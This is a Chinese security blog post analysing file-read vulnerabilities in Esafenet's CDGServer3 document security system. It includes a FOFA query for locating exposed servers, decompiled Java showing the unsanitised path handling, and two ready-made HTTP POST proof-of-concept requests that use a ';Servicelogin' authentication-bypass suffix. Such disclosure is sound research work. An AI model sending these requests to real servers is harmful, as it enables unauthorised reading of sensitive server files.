---
title: "亿赛通-电子文档安全管理系统 DecryptApplication 多个文件读取漏洞"
source: https://mrxn.net/jswz/CDGServer3-DecryptApplication-file_read.html
asset_dir: assets/亿赛通-电子文档安全管理系统-decryptapplication-多个文件读取漏洞
---

# 亿赛通-电子文档安全管理系统 DecryptApplication 多个文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/3 08:10
* 776浏览
* [0评论](#comment)
* 39分钟阅读

深入探索

网页浏览器

服务器安全服务

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

亿赛通电子文档安全管理系统的 DecryptApplication 接口ViewDecyptFile方法存在[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。攻击者可通过构造特定请求，利用该接口的 `decryptFileId`、`filePath` 等参数读取服务器上文件内容，从而获取敏感信息。

文件大小转换

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"
>
> 漏洞修复方案

# 漏洞分析

PS: 相关权限绕过简析参考[亿赛通电子文档安全管理系统 AppExamList.jsp SQL注入漏洞](https://mrxn.net/jswz/esafenet-AppExamList-sqli.html)

根据 web.xml 里对 DecryptApplication 的定义

```
<!-- DecryptApplication -->
<servlet>
    <servlet-name>DecryptApplication</servlet-name>
    <display-name>DecryptApplication</display-name>
    <servlet-class>
       com.esafenet.servlet.client.DecryptApplicationService
    </servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>DecryptApplication</servlet-name>
    <url-pattern>/client/DecryptApplication</url-pattern>
</servlet-mapping>
```

深入探索

在线安全工具

漏洞预警服务

安全研究工具

可知，访问路由为 /client/DecryptApplication ，具体实现逻辑类为 `com.esafenet.servlet.client.DecryptApplicationService`

## ViewDecyptFile

再看**ViewDecyptFile**方法的实现逻辑

```
public void actionViewDecyptFile(HttpServletRequest req, HttpServletResponse res) throws IOException, ServletException, Exception {
    String decryptFileId = RequestUtil.getParameter(req, "decryptFileId", "");
    String fileName = RequestUtil.getParameter(req, "fileName", "");
    String fileNameFinal = fileName.substring(fileName.lastIndexOf("\\") + 1);
    this.model.downLoadDecyptFile(decryptFileId, req, res, fileNameFinal);
}
```

跟进**downLoadDecyptFile**方法

```
public void downLoadDecyptFile(String decryptFileId, HttpServletRequest req, HttpServletResponse res, String fName) throws IOException {
    String filePath = this.getDir();
    String fileName = filePath + decryptFileId;
    if (decryptFileId != null && !decryptFileId.trim().equals("")) {
        File file = new File(fileName);
        boolean isRead = false;

        try {
            long bgn = file.lastModified();
            Thread.sleep(10L);
            long end = file.lastModified();
            if (end != bgn) {
                isRead = true;
            }
        } catch (InterruptedException e1) {
            e1.printStackTrace();
        }

        if (file.exists() && !isRead) {
            CDGUtil.downFile(fileName, res, fName);
```

fileName由参数decryptFileId与当前路径进行拼接后使用`new File (` 进行文件操作，获取基本信息与判断后进入`CDGUtil.downFile` 方法

```
public static void downFile(String fileWholePath, HttpServletResponse response, String fileName) throws IOException {
    FileInputStream fis = null;
    BufferedInputStream bis = null;
    BufferedOutputStream bos = null;
    ServletOutputStream servletoutputstream = null;

    try {
        fis = new FileInputStream(fileWholePath);
        bis = new BufferedInputStream(fis);
        servletoutputstream = response.getOutputStream();
        bos = new BufferedOutputStream(servletoutputstream);
        String dlName = new String(fileName.getBytes(), "ISO8859_1");
        response.setContentType("application/MIME-CobraDG;charset=\"GB2312\";Content-Disposition:attachment;filename=" + dlName);
        response.setHeader("Content-Disposition", "attachment;filename=" + dlName);
        byte[] abyte1 = new byte[4096];

        int size;
        for(size = 0; (size = bis.read(abyte1)) != -1; abyte1 = new byte[4096]) {
            bos.write(abyte1, 0, size);
        }

        bos.flush();
```

直接输出上面获取到的文件流信息到响应里，文件路径拼接过程中无任何过滤和校验，导致[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞（有限）。

漏洞修复方案

## ViewUploadFile

[![亿赛通-电子文档安全管理系统 DecryptApplication 多个文件读取漏洞](images/img-001-305ca41a7d4b.webp)](https://image.mrxn.net/00d1e0dc28504806a51441a9080870de.webp)

[![亿赛通-电子文档安全管理系统 DecryptApplication 多个文件读取漏洞](images/img-002-c9b63ddac947.webp)](https://image.mrxn.net/cdd4d20327e747c48b1e9dee5dcddc97.webp)

# 漏洞复现

## ViewDecyptFile

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

command=ViewDecyptFile&decryptFileId=FILE_READ_POC&fileName=1.png
```

[![亿赛通-电子文档安全管理系统 DecryptApplication 多个文件读取漏洞](images/img-003-18f937a81ac9.webp)](https://image.mrxn.net/ef25a8aa403842e6b575e8c15d36c8df.webp)

成功读取到C:/Windows/win.ini文件内容

## ViewUploadFile

```
POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
Host: CDGServer3.mrxn.net
Content-Type: application/x-www-form-urlencoded

command=ViewUploadFile&filePath=FILE_READ_POC&fileName1=1.png&uploadFileId=1
```

[![亿赛通-电子文档安全管理系统 DecryptApplication 多个文件读取漏洞](images/img-004-c91fa4a51d05.webp)](https://image.mrxn.net/d91fc17b337544e1b71d4ed1bba721a0.webp)

也成功读取到C:/Windows/win.ini文件内容

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.ViewDecyptFile](#toc-4-1-)
* [4.2.ViewUploadFile](#toc-4-2-)
* [5.漏洞复现](#toc-5-)
* [5.1.ViewDecyptFile](#toc-5-1-)
* [5.2.ViewUploadFile](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[亿赛通-电子文档安全管理系统 DecryptApplication 多个文件读取漏洞](https://mrxn.net/jswz/CDGServer3-DecryptApplication-file_read.html)  
文章链接：<https://mrxn.net/jswz/CDGServer3-DecryptApplication-file_read.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

文件大小转换

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/CDGServer3-DecryptApplication-file\_read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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